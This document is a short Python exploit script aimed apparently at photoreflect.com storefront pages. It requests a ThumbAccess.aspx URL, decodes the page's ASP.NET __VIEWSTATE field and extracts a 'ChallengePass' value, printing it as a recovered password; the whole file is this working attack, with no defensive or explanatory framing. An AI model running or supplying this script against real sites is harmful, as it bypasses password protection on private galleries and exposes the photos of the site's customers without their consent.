#!/usr/bin/python3
import requests
import base64
import sys
import re

def run(url):
    print("URL: {0}".format(url))
    try:
        r = requests.get(url)
    except:
        print("An error happened.")
        sys.exit(0)
    encoded = re.findall("<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*?)\" />", r.text)
    if len(encoded):
        decoded = base64.b64decode(encoded[0])
        password = re.findall(b"ChallengePass\x05(.*?)\x16", decoded)
        if len(password):
            print("Password: {0}".format(password[0][1:].decode('utf-8')))
        else:
            print("Password Recovery Failed!")
    else:
        print("Password Recovery Failed!")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("use: {0} http://something.photoreflect.com/tore/ThumbAccess.aspx?e=numbers".format(sys.argv[0]))
        sys.exit(0)
    run(url=sys.argv[1])
